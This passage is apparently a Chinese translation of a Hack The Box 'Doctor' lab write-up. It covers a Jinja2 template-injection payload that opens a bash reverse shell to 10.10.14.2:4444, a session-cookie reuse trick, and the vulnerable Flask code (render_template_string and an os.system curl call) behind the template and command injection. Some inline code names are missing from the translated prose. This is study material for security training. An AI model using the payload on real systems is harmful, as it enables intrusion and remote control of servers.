    1|Doctor blog|2020-09-18 20:48:37.55555|A free blog to share medical knowledge. Be kind!|1
    2|{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").read()}}{%endif%}{%endfor%}|2020-09-28 13:01:21.252038|dsdsdsa|2
    

我从 中抓取了“干净”数据库的副本，它只显示了一个用户：`/opt/clean`

    sqlite> select * from user;
    1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
    

只有一个帖子：

    sqlite> select * from post;
    1|Doctor blog|2020-09-18 20:48:37.55555|A free blog to share medical knowledge. Be kind!|1
    

#### 把它们放在一起

一旦我等到清理作业运行，用户 ID 为 2 的用户现在可用。如果我注册此用户，我将获得一个带有此用户 ID 2 的签名 Cookie。现在，如果我重置该框，则在重置时，已经有一个用户ID为2的用户 - shaun。当我使用该cookie访问该页面时，我已经以肖恩的身份登录。

### 模板注入

模板注入在路由中进行，该路由在 中定义：`/archive``/home/web/blog/flaskblog/main/routes.py`

    from flask import render_template, render_template_string, request, Blueprint
    from flask_login import current_user, login_required
    from flaskblog.models import Post
    
    main = Blueprint('main', __name__)
    
    
    @main.route("/")
    @main.route("/home")
    @login_required
    def home():
            page = request.args.get('page', 1, type=int)
            posts = Post.query.order_by(Post.date_posted.asc()).paginate(page=page, per_page=10)
            return render_template('home.html', posts=posts, author=current_user)
    
    
    @main.route("/archive")
    def feed():
            posts = Post.query.order_by(Post.date_posted.asc())
            tpl = '''
            <?xml version="1.0" encoding="UTF-8" ?>
            <rss version="2.0">
            <channel>
            <title>Archive</title>
            '''
            for post in posts:
                    if post.author==current_user:
                            tpl += "<item><title>"+post.title+"</title></item>\n"
                            tpl += '''
                            </channel>
                            '''
            return render_template_string(tpl)
    

代码只是循环遍历所有帖子，并在每次有作者与当前用户匹配的帖子时添加 XML，将输出构建为字符串。然后，该字符串将传递给 ，这是传递用户输入[的危险函数](https://blog.nvisium.com/injecting-flask)。`render_template_string`

另一方面，我可以查看如何将相同的输入传递到主页。post 数组将传递给 。该模板循环访问帖子并将内容放入模板中：`render_template``home.html`

    {% extends "layout.html" %}
    {% block content %}
        {% for post in posts.items %}
            {% if post.author == current_user %}
            <article class="media content-section">
              <img class="rounded-circle article-img" src="{{ url_for('static', filename='profile_pics/' + post.author.image_file) }}">
              <div class="media-body">
                <div class="article-metadata">
                  <a class="mr-2" href="{{ url_for('users.user_posts', username=post.author.username) }}">{{ post.author.username }}</a>
                  <small class="text-muted"></small>
                </div>
                <h2><a class="article-title" href="{{ url_for('posts.post', post_id=post.id) }}">{{ post.title }}</a></h2>
                <p class="article-content">{{ post.content }}</p>
              </div>
            </article>
            {% endif %}
        {% endfor %}
        {% for page_num in posts.iter_pages(left_edge=1, right_edge=1, left_current=1, right_current=2) %}
          {% if page_num %}
            {% if posts.page == page_num %}
              <a class="btn btn-info mb-4" href="{{ url_for('main.home', page=page_num) }}">{{ page_num }}</a>
            {% else %}
              <a class="btn btn-outline-info mb-4" href="{{ url_for('main.home', page=page_num) }}">{{ page_num }}</a>
            {% endif %}
          {% else %}
            ...
          {% endif %}
        {% endfor %}
    {% endblock content %}
    

因为 被引用并加载为 ，发送的文本只是作为 的一部分插入到这里，因此，它不会传递到也不会执行。`post.title``{{ post.title }}``rendor``rendor`

### 命令注入

我怀疑命令注入是在某种链接验证脚本中，这是正确的。处理已提交帖子的路由位于 中，包括：`/home/web/blog/flaskblog/posts/routes.py`

    @posts.route("/post/new", methods=['GET', 'POST']) 
    @login_required                    
    def new_post():
        form = PostForm()
        if form.validate_on_submit():
            post = Post(title=form.title.data, content=form.content.data, author=current_user)
            db.session.add(post)
            db.session.commit()
            flash('Your post has been created!', 'success')
            return redirect(url_for('main.home'))
        return render_template('create_post.html', title='New Post',
                               form=form, legend='New Post')
    

该对象用于验证提交，并在 中定义：`PostForm``/home/web/blog/flaskblog/posts/forms.py`

    class PostForm(FlaskForm):
        class Meta:
           csrf = False
        title = StringField('Title', validators=[DataRequired()])
        content = TextAreaField('Content', validators=[DataRequired()])
        submit = SubmitField('Post')
       
    
        def validate_content(self, form):
            text = form.data
            urls = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', text)
            for url in urls:
                url = urls[0]
                random_hex = secrets.token_hex(8)
                path = f'{current_app.root_path}/tmp/blacklist/{random_hex}'
                os.system(f'/bin/curl --max-time 2 {url} -o {path}')
                try:
                    with open(path, 'r') as f:
                        content = f.read()
                        for keyword in blacklist:
                            if keyword in text:
                                raise ValidationError('A link you posted lead to a site with blacklisted content!')
                except FileNotFoundError:
                    raise ValidationError('A link you posted was not valid!')
    

该函数检查内容中的任何 url，然后 运行 以尝试连接到它们。这就是我能够注入的。我不能在url中使用空格的原因是它在正则表达式上不匹配。`validate_content``os.system``curl`

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/02/06/htb-doctor.html)